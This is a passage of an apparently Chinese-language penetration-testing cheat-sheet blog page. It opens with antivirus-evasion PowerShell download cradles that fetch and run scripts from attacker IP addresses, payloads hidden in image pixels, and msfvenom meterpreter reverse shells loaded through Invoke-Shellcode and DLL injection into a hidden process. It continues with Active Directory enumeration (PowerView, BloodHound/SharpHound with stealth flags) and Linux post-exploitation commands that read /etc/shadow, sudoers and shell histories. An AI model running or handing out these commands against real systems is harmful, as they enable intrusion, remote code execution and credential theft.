<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>也可以对http字符进行绕过，同样可以bypass</span></span>
<span class="line"><span>powershell "$a='IEX((new-object net.webclient).downloadstring("ht';$b='tp://192.168.197.192/a.ps1"))';IEX ($a+$b)"  </span></span></code></pre>
<p><strong>图片免杀</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。</span></span>
<span class="line"><span>https://github.com/peewpw/Invoke-PSImage</span></span>
<span class="line"><span>1900*1200的图片x.jpg。</span></span>
<span class="line"><span>C:\powershell </span></span>
<span class="line"><span>PS C:\ Import-Module .\Invoke-PSImage.ps1 </span></span>
<span class="line"><span>PS C:\ Invoke-PSImage -Script .\a.ps1 -Image .\x.jpg -Out .\reverse_shell.png -Web </span></span>
<span class="line"><span>a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。</span></span>
<span class="line"><span>将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。</span></span></code></pre>
<p><strong>加载shellcode</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>msfvenom生成脚本木马</span></span>
<span class="line"><span>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  </span></span>
<span class="line"><span>在windows靶机上运行一下命令</span></span>
<span class="line"><span>PS IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1") </span></span>
<span class="line"><span>PS IEX(New-Object Net.WebClient).DownloadString("http://192.168.72.164/test") </span></span>
<span class="line"><span>Invoke-Shellcode -Shellcode $buf -Force  运行木马 </span></span>
<span class="line"><span>使用Invoke-Shellcode.ps1脚本执行shellcode</span></span>
<span class="line"><span>即可反弹meterpreter shell</span></span></code></pre>
<p><strong>加载dll</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>使用msfvenom 生成dll木马脚本</span></span>
<span class="line"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll </span></span>
<span class="line"><span>将生成的dll上传到目标的C盘。在靶机上执行以下命令</span></span>
<span class="line"><span>PS IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1") </span></span>
<span class="line"><span>Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden  </span></span>
<span class="line"><span>创建新的进程启动记事本，并设置为隐藏</span></span>
<span class="line"><span>Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll 使用notepad的PID  </span></span>
<span class="line"><span>Msf</span></span>
<span class="line"><span>use exploit/multi/handler</span></span>
<span class="line"><span>set payload windows/x64/meterpreter/reverse_tcp</span></span>
<span class="line"><span>run</span></span></code></pre>
<h1 id="powerview">Powerview<a class="anchor-link" href="#powerview"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>获取当前域信息</span></span>
<span class="line"><span>powershell -exec bypass -Command "&#x26;{Import-Module .\powerview.ps1; Get-NetDomain}"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/302.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>powershell -exec bypass -Command "&#x26;{Import-Module .\powerview.ps1; get-netforest}"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/303.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>枚举管理员</span></span>
<span class="line"><span>powershell -exec bypass -Command "&#x26;{Import-Module .\powerview.ps1; Invoke-EnumerateLocalAdmin}"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/304.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>查询管理在线的机器</span></span>
<span class="line"><span>powershell -exec bypass -Command "&#x26;{Import-Module .\powerview.ps1; invoke-userhunter}"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/305.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>查看域内机器以administrator权限运行的进程</span></span>
<span class="line"><span>powershell -exec bypass -Command "&#x26;{Import-Module .\powerview.ps1; invoke-processhunter }"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/306.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>或指定参数userfile和computerfile查询某台机器某个用户的进程</span></span>
<span class="line"><span>powershell -exec bypass -Command "&#x26;{Import-Module .\powerview.ps1; invoke-processhunter -Userfile .\user.txt -computerfile .\host.txt}"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/307.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>查询域内机器共享</span></span>
<span class="line"><span>powershell -exec bypass -Command "&#x26;{Import-Module .\powerview.ps1; Invoke-sharefinder}"</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/308.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>查询域内机器</span></span>
<span class="line"><span>Get-NetComputer -Domain zone.com</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/309.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器</span></span></code></pre>
<p></p><figure class="markdown-image-wrapper"><img src="https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/310.png" alt="image" loading="lazy" decoding="async" class="markdown-image"></figure><p></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Dev-powerview</span></span>
<span class="line"><span>获取域控机器和win版本</span></span>
<span class="line"><span>Get-DomainController |select name,osversion|fl </span></span>
<span class="line"><span>枚举其他域： Get-NetDomain -Domain &#x3C;DomainName</span></span>
<span class="line"><span>获取域 SID： Get-DomainSID</span></span>
<span class="line"><span>获取域策略：Get-DomainPolicy</span></span>
<span class="line"><span>获取域控制器：</span></span>
<span class="line"><span>Get-NetDomainController</span></span>
<span class="line"><span>Get-NetDomainController -Domain &#x3C;DomainName</span></span>
<span class="line"><span>枚举域用户：</span></span>
<span class="line"><span>Get-NetUser</span></span>
<span class="line"><span>Get-NetUser -SamAccountName &#x3C;user </span></span>
<span class="line"><span>Get-NetUser | select cn</span></span>
<span class="line"><span>检查上次修改密码</span></span>
<span class="line"><span>Get-UserProperty -Properties pwdlastset</span></span>
<span class="line"><span>枚举域计算机</span></span>
<span class="line"><span>Get-NetComputer -FullData</span></span>
<span class="line"><span>Get-DomainGroup</span></span>
<span class="line"><span>枚举存活主机</span></span>
<span class="line"><span>Get-NetComputer -Ping</span></span>
<span class="line"><span>枚举组策略：Get-NetGPO</span></span>
<span class="line"><span>显示某台机器的活动策略</span></span>
<span class="line"><span>Get-NetGPO -ComputerName &#x3C;Name of the PC</span></span>
<span class="line"><span>枚举 OU：</span></span>
<span class="line"><span>Get-NetOU -FullData </span></span>
<span class="line"><span>Get-NetGPO -GPOname &#x3C;The GUID of the GPO</span></span>
<span class="line"><span>枚举域信任：</span></span>
<span class="line"><span>Get-NetDomainTrust</span></span>
<span class="line"><span>Get-NetDomainTrust -Domain &#x3C;DomainName</span></span>
<span class="line"><span>查找当前域中当前用户具有本地管理员访问权限的所有计算机</span></span>
<span class="line"><span>Find-LocalAdminAccess -Verbose</span></span>
<span class="line"><span>在域的所有机器上查找本地管理员</span></span>
<span class="line"><span>Invoke-EnumerateLocalAdmin -Verbose</span></span>
<span class="line"><span>全部使用技巧</span></span>
<span class="line"><span>https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993</span></span></code></pre>
<h1 id="linux">Linux<a class="anchor-link" href="#linux"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>操作系统&#x26;内核版本&#x26;环境变量</span></span>
<span class="line"><span>cat /etc/issue</span></span>
<span class="line"><span>cat /etc/*-release</span></span>
<span class="line"><span>cat /etc/lsb-release</span></span>
<span class="line"><span>cat /etc/redhat-release</span></span>
<span class="line"><span>cat /proc/version</span></span>
<span class="line"><span>uname -a</span></span>
<span class="line"><span>uname -mrs</span></span>
<span class="line"><span>rpm -q kernel</span></span>
<span class="line"><span>dmesg | grep Linux</span></span>
<span class="line"><span>ls /boot | grep vmlinuz-</span></span>
<span class="line"><span>cat /etc/profile</span></span>
<span class="line"><span>cat /etc/bashrc</span></span>
<span class="line"><span>cat ~/.bash_profile</span></span>
<span class="line"><span>cat ~/.bashrc</span></span>
<span class="line"><span>cat ~/.bash_logout</span></span>
<span class="line"><span>env</span></span>
<span class="line"><span>set</span></span>
<span class="line"><span>Root权限进程</span></span>
<span class="line"><span>ps aux | grep root</span></span>
<span class="line"><span>ps -ef | grep root</span></span>
<span class="line"><span>计划任务</span></span>
<span class="line"><span>crontab -l</span></span>
<span class="line"><span>ls -alh /var/spool/cron</span></span>
<span class="line"><span>ls -al /etc/ | grep cron</span></span>
<span class="line"><span>ls -al /etc/cron*</span></span>
<span class="line"><span>cat /etc/cron*</span></span>
<span class="line"><span>cat /etc/at.allow</span></span>
<span class="line"><span>cat /etc/at.deny</span></span>
<span class="line"><span>cat /etc/cron.allow</span></span>
<span class="line"><span>cat /etc/cron.deny</span></span>
<span class="line"><span>cat /etc/crontab</span></span>
<span class="line"><span>cat /etc/anacrontab</span></span>
<span class="line"><span>cat /var/spool/cron/crontabs/root</span></span>
<span class="line"><span>IP信息</span></span>
<span class="line"><span>/sbin/ifconfig -a</span></span>
<span class="line"><span>cat /etc/network/interfaces</span></span>
<span class="line"><span>cat /etc/sysconfig/network</span></span>
<span class="line"><span>连接信息</span></span>
<span class="line"><span>grep 80 /etc/services</span></span>
<span class="line"><span>netstat -antup</span></span>
<span class="line"><span>netstat -antpx</span></span>
<span class="line"><span>netstat -tulpn</span></span>
<span class="line"><span>chkconfig --list</span></span>
<span class="line"><span>chkconfig --list | grep 3:on</span></span>
<span class="line"><span>last</span></span>
<span class="line"><span>w</span></span>
<span class="line"><span>用户信息</span></span>
<span class="line"><span>id</span></span>
<span class="line"><span>whomi</span></span>
<span class="line"><span>w</span></span>
<span class="line"><span>last</span></span>
<span class="line"><span>cat /etc/passwd</span></span>
<span class="line"><span>cat /etc/group</span></span>
<span class="line"><span>cat /etc/shadow</span></span>
<span class="line"><span>ls -alh /var/mail/</span></span>
<span class="line"><span>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # 列出超级用户</span></span>
<span class="line"><span>awk -F: '($3 == "0") {print}' /etc/passwd   #列出超级用户</span></span>
<span class="line"><span>cat /etc/sudoers</span></span>
<span class="line"><span>sudo –l</span></span>
<span class="line"><span>操作记录</span></span>
<span class="line"><span>cat ~/.bash_history</span></span>
<span class="line"><span>cat ~/.nano_history</span></span>
<span class="line"><span>cat ~/.atftp_history</span></span>
<span class="line"><span>cat ~/.mysql_history</span></span>
<span class="line"><span>cat ~/.php_history</span></span>
<span class="line"><span>可写目录</span></span>
<span class="line"><span>find / -writable -type d 2/dev/null      # 可写目录</span></span>
<span class="line"><span>find / -perm -222 -type d 2/dev/null     # 可写目录 </span></span>
<span class="line"><span>find / -perm -o w -type d 2/dev/null     # 可写目录</span></span>
<span class="line"><span>find / -perm -o x -type d 2/dev/null     # 可执行目录</span></span>
<span class="line"><span>find / \( -perm -o w -perm -o x \) -type d 2/dev/null   # 可写可执行目录</span></span></code></pre>
<h1 id="addomain">ADDomain<a class="anchor-link" href="#addomain"><span class="icon icon-link"></span></a></h1>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>获取当前域： Get-ADDomain</span></span>
<span class="line"><span>枚举其他域： Get-ADDomain -Identity &#x3C;Domain</span></span>
<span class="line"><span>获取域 SID： Get-DomainSID</span></span>
<span class="line"><span>获取域控制器：</span></span>
<span class="line"><span>Get-ADDomainController</span></span>
<span class="line"><span>Get-ADDomainController -Identity &#x3C;DomainName</span></span>
<span class="line"><span>枚举域用户：</span></span>
<span class="line"><span>Get-ADUser -Filter * -Identity &#x3C;user -Properties *</span></span>
<span class="line"><span>枚举域计算机：</span></span>
<span class="line"><span>Get-ADComputer -Filter * -Properties *</span></span>
<span class="line"><span>Get-ADGroup -Filter * </span></span>
<span class="line"><span>枚举域信任：</span></span>
<span class="line"><span>Get-ADTrust -Filter *</span></span>
<span class="line"><span>Get-ADTrust -Identity &#x3C;DomainName</span></span>
<span class="line"><span>枚举域林信任：</span></span>
<span class="line"><span>Get-ADForest</span></span>
<span class="line"><span>Get-ADForest -Identity &#x3C;ForestName</span></span>
<span class="line"><span>枚举本地 AppLocker 有效策略：</span></span>
<span class="line"><span>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span></span></code></pre>
<h1 id="bloodhoundad">BloodHoundAD<a class="anchor-link" href="#bloodhoundad"><span class="icon icon-link"></span></a></h1>
<p><strong>AzureHound</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>. .\AzureHound.ps1</span></span>
<span class="line"><span>Invoke-AzureHound</span></span></code></pre>
<p><strong>BloodHound</strong></p>
<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>.\SharpHound.exe -c all -d active.htb --searchforest</span></span>
<span class="line"><span>搜集不包括GPOLocalGroup的信息</span></span>
<span class="line"><span>.\SharpHound.exe -c all,GPOLocalGroup</span></span>
<span class="line"><span>只从DC手机信息</span></span>
<span class="line"><span>.\SharpHound.exe --CollectionMethod DCOnly</span></span>
<span class="line"><span>.\SharpHound.exe -c all --LdapUsername &#x3C;UserName --LdapPassword &#x3C;Password --JSONFolder &#x3C;PathToFile</span></span>
<span class="line"><span>.\SharpHound.exe -c all --LdapUsername &#x3C;UserName --LdapPassword &#x3C;Password --domaincontroller 10.10.10.100 -d active.htb</span></span>
<span class="line"><span>.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23</span></span>
<span class="line"><span>或使用powershell</span></span>
<span class="line"><span>https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</span></span>
<span class="line"><span>/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1</span></span>
<span class="line"><span>Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public</span></span>
<span class="line"><span>Invoke-BloodHound -CollectionMethod All  -LDAPUser &#x3C;UserName -LDAPPass &#x3C;Password -OutputDirectory &#x3C;PathToFile</span></span>
<span class="line"><span>或远程使用BloodHound Python</span></span>
<span class="line"><span>https://github.com/fox-it/BloodHound.py</span></span>
<span class="line"><span>pip install bloodhound</span></span>
<span class="line"><span>bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all</span></span>
<span class="line"><span>使用 Certipy 收集更多用于证书利用的数据</span></span>
<span class="line"><span>certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound</span></span>
<span class="line"><span>然后将 zip/json 文件导入 Neo4J 数据库并进行查询。</span></span>
<span class="line"><span>apt install bloodhound </span></span>
<span class="line"><span>启动BloodHound和数据库</span></span>
<span class="line"><span>neo4j console</span></span>
<span class="line"><span>或者使用docker</span></span>
<span class="line"><span>docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j</span></span>
<span class="line"><span>./bloodhound --no-sandbox</span></span>
<span class="line"><span>访问http://127.0.0.1:7474  user:neo4J, pass:neo4j</span></span></code></pre> </div>  <astro-island uid="Z1v8zuY" prefix="r16" component-url="/_astro/EmbedHydrator.86VYQ3Qy.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;EmbedHydrator&quot;,&quot;value&quot;:true}"></astro-island> <astro-island uid="27sCYi" prefix="r17" component-url="/_astro/CustomContentEnhancer.BXo4OX_Z.js" component-export="CustomContentEnhancer" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;config&quot;:[0,{&quot;addBlankTarget&quot;:[0,true],&quot;smoothScroll&quot;:[0,true],&quot;addHeadingLevel&quot;:[0,true],&quot;enhanceCodeBlock&quot;:[0,true],&quot;enableCodeCopy&quot;:[0,true],&quot;enableCodeFullscreen&quot;:[0,true],&quot;enableLinkEmbed&quot;:[0,true],&quot;enableTweetEmbed&quot;:[0,true],&quot;enableOGPreview&quot;:[0,true],&quot;previewCacheTime&quot;:[0,3600],&quot;lazyLoadEmbeds&quot;:[0,true]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;CustomContentEnhancer&quot;,&quot;value&quot;:true}"></astro-island> </article> <astro-island uid="wBKw9" prefix="r5" component-url="/_astro/GiscusComments.BbSyCEJN.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;GiscusComments&quot;,&quot;value&quot;:true}" await-children><div class="w-full pb-12"></div><!--astro:end--></astro-island> </div>  <div class="tablet:grid-cols-1 grid grid-cols-2 gap-4 px-10 md:px-6"><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold">推荐文章</h2><div class="flex flex-col gap-2"><a href="/blog/post/14" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">1</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">GodenEye</div></div></a><a href="/blog/post/15" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">2</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Mr-Robot</div></div></a><a href="/blog/post/2" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">3</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Linux</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">CentOS离线升级</div></div></a><a href="/blog/post/17" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">4</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Metasploitable-2</div></div></a><a href="/blog/post/19" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">5</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Reproduction</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Kioptrix level 3</div></div></a></div></div><div class="flex flex-col gap-4"><h2 class="text-foreground/80 text-2xl font-semibold">相关文章</h2><div class="flex flex-col gap-2"><a href="/blog/post/12" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">1</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">信息收集</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">信息收集</div></div></a><a href="/blog/post/25" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">2</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">信息收集</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">一些情报源</div></div></a><a href="/blog/post/8" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">3</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">信息收集</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">人肉搜索</div></div></a><a href="/blog/post/7" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">4</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Others</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">个人技能梳理</div></div></a><a href="/blog/post/20" class="group hover:text-primary hover:bg-foreground/5 flex gap-3 rounded-md p-2 text-sm transition-colors duration-300"><span class="text-foreground/30 shrink-0 font-mono">5</span><div class="flex min-w-0 flex-col gap-0.5"><div class="text-foreground/50 truncate text-xs">Linux</div><div class="text-foreground/80 group-hover:text-primary line-clamp-2 transition-colors">Arch安装</div></div></a></div></div></div><footer class="mt-auto pb-6 md:pb-4"><div class="mx-auto flex flex-col items-center gap-3 px-6 md:px-3 max-w-7xl"><div class="text-muted-foreground flex flex-wrap items-center justify-center gap-6 text-sm md:gap-4"><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点总字数"><i class="fa-regular fa-file-lines text-sm" aria-hidden="true"></i><span class="font-medium">39k</span><span class="text-xs">字</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="站点阅读时长"><i class="fa-regular fa-clock text-sm" aria-hidden="true"></i><span class="font-medium">3:27</span></button><div class="bg-muted-foreground/30 h-4 w-px"></div><button class="flex items-center gap-2 opacity-75 transition-opacity duration-300 hover:opacity-100" title="文章总数"><i class="fa-regular fa-newspaper text-sm" aria-hidden="true"></i><span class="font-medium">29</span><span class="text-xs">篇</span></button></div><div class="text-muted-foreground flex items-center gap-0.5 text-sm"><span class="opacity-75">Â©</span><span class="font-medium opacity-75">2022</span><span class="opacity-50">-</span><span class="font-medium opacity-75" itemProp="copyrightYear">2026</span><svg class="mx-1 size-5 animate-spin text-[#FFC0CB] duration-10000" viewBox="0 0 512 512" fill="currentColor"><g><path fill="currentColor" d="M330.555,101.873c0-34.164-13.767-65.108-36.047-87.622c-2.432-2.465-9.63-4.349-14.212,3.466
		c-4.589,7.808-17.205,27.431-17.205,27.431c-1.534,2.438-4.219,3.918-7.089,3.918c-2.883,0-5.555-1.48-7.089-3.918
		c0,0-12.623-19.623-17.205-27.431c-4.582-7.815-11.781-5.931-14.219-3.466c-22.274,22.514-36.04,53.458-36.04,87.622
		c0,51.02,30.663,94.847,74.553,114.142C299.892,196.72,330.555,152.892,330.555,101.873z"></path><path fill="currentColor" d="M204.51,253.425c-4.78-47.705-36.998-90.409-85.518-106.176c-32.492-10.554-66.177-7.027-94.47,7.205
		c-3.096,1.555-7.117,7.822-1.096,14.589c6.007,6.774,20.766,24.842,20.766,24.842c1.849,2.212,2.432,5.22,1.542,7.952
		c-0.891,2.74-3.13,4.829-5.918,5.528c0,0-22.562,5.945-31.404,7.89c-8.849,1.945-9.281,9.37-7.692,12.445
		c14.527,28.144,39.698,50.801,72.197,61.362C121.436,304.828,172.6,289.212,204.51,253.425z"></path><path fill="currentColor" d="M96.772,362.484c-20.082,27.643-27.136,60.766-22.342,92.074c0.527,3.424,5.233,9.178,13.527,5.554
		c8.308-3.63,30.054-12.088,30.054-12.088c2.672-1.062,5.698-0.692,8.041,1c2.329,1.692,3.623,4.466,3.418,7.335
		c0,0-1.308,23.294-2.199,32.315c-0.883,9.006,6.048,11.712,9.466,11.15c31.252-5.116,60.581-22.054,80.662-49.704
		c29.993-41.266,30.944-94.758,6.781-136.155C177.332,303.773,126.758,321.204,96.772,362.484z"></path><path fill="currentColor" d="M287.824,313.964c-24.165,41.397-23.212,94.888,6.78,136.155c20.082,27.65,49.41,44.588,80.663,49.704
		c3.418,0.562,10.349-2.144,9.466-11.15c-0.89-9.021-2.205-32.315-2.205-32.315c-0.198-2.869,1.102-5.643,3.431-7.335
		c2.322-1.692,5.363-2.062,8.034-1c0,0,21.746,8.458,30.047,12.088c8.294,3.623,13.007-2.13,13.534-5.554
		c4.787-31.308-2.254-64.43-22.342-92.074C385.246,321.204,334.672,303.766,287.824,313.964z"></path><path fill="currentColor" d="M503.6,215.254c-8.849-1.945-31.41-7.89-31.41-7.89c-2.795-0.706-5.027-2.788-5.918-5.528
		c-0.89-2.732-0.308-5.74,1.534-7.952c0,0,14.76-18.068,20.78-24.842c6.014-6.766,1.993-13.034-1.096-14.589
		c-28.301-14.232-61.978-17.76-94.485-7.205c-48.519,15.767-80.731,58.472-85.512,106.176
		c31.91,35.787,83.067,51.403,131.593,35.636c32.492-10.561,57.67-33.218,72.191-61.362
		C512.867,224.624,512.449,217.199,503.6,215.254z"></path></g></svg><span class="author font-medium opacity-75" itemProp="copyrightHolder">Kaguya<!-- -->@Kaguya</span></div><div class="fixed bottom-1 left-1 z-20 flex flex-col items-start gap-2"><script src="https://fastly.jsdelivr.net/npm/live2d-widgets@1.0.0-rc.4/dist/autoload.js"></script></div><div class="text-muted-foreground/80 flex items-center gap-2 text-xs"><span class="opacity-75">Powered by theme</span><a href="https://github.com/kaguyahi/astro-kaguya" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">astro-kaguya</a><span class="opacity-50">In·</span><span class="opacity-75">From by</span><a href="https://github.com/XueHua-s/astro-snow" target="_blank" rel="noreferrer" class="footer-link font-medium transition-all duration-300">snow-koharu</a></div></div></footer> </div> </div> </div>  </main> <div id="floating-nav" class="text-primary fixed right-4 bottom-4 z-50 flex flex-col gap-2" 